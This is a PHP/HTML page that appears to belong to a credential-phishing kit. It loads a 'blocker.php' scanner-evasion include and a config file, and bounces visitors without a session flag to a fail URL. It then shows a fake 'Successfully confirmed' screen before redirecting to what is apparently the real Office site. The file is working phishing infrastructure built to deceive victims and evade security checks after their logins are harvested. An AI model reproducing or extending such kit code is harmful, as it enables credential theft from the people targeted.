<?php

error_reporting(0);include('blocker.php');include('config.php');@session_start();
function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);

if (!isset($_SESSION["success"]) ) {die(header("Location: ".$FailRedirect));}else{unset($_SESSION["success"]);}
unset($_SESSION["NOTEXPIRED"]);
$_SESSION["NOTALLOW"]=true;

?>
<html>
  <head>
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700,900&display=swap" rel="stylesheet">
  </head>
    <style>
      body {
        text-align: center;
        padding: 40px 0;
        background: #EBF0F5;
      }
        h1 {
          color: #88B04B;
          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
          font-weight: 900;
          font-size: 40px;
          margin-bottom: 10px;
        }
        p {
          color: #404F5E;
          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
          font-size:20px;
          margin: 0;
        }
      i {
        color: #9ABC66;
        font-size: 100px;
        line-height: 200px;
        margin-left:-15px;
      }
      .card {
        background: white;
        padding: 60px;
        border-radius: 4px;
        box-shadow: 0 2px 3px #C8D0D8;
        display: inline-block;
        margin: 0 auto;
      }
    </style>
    <body>
      <div class="card">
      <div style="border-radius:200px; height:200px; width:200px; background: #F8FAF5; margin:0 auto;">
        <i class="checkmark">✓</i>
      </div>
        <h1><?if(isset($successMsgTitle)){echo $successMsgTitle;}else{echo 'Success';}?></h1> 
        <p><br/><?if(isset($successMsg)){echo $successMsg;}else{echo 'Successfully confirmed. Redirecting to home page ...';}?></p>
      </div>
              <script type="text/javascript">
setTimeout(function(){
            window.location.href = '<?=$officeLink?>';
         }, <?if(isset($successMsgTimeout)){echo $successMsgTimeout;}else{echo '1000';}?>);

setTimeout(function(){
document.getElementById('autoclick').click();
         }, <?if(isset($successMsgTimeout)){echo $successMsgTimeout;}else{echo '1000';}?>);
         
</script>
    </body>
</html>